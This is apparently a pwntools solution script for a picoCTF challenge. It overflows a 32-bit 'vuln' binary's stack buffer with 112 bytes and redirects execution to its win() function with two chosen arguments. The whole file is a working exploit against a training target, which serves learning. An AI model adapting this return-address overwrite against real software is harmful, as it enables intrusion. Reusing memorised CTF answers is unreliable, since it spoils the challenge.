from pwn import *

# ==== Configuration ====
DEBUG = False  # Set to True for local testing
HOST = 'saturn.picoctf.net'
PORT = 56954

elf = context.binary = ELF('./vuln')  # Local binary for symbols
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.arch = 'i386'  # Assuming it's 32-bit

# ==== Addresses and Payload ====
offset = 112
win_addr = elf.symbols['win']
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D

# ==== Start Local or Remote ====
if DEBUG:
    p = process()
else:
    p = remote(HOST, PORT)

# ==== Build Payload ====
payload = b"A" * offset
payload += p32(win_addr)      # Overwrite return address
payload += b"B" * 4           # Filler for return addr of win()
payload += p32(arg1)          # arg1
payload += p32(arg2)          # arg2

# ==== Exploit ====
p.sendlineafter(b"Please enter your string:", payload)
p.interactive()
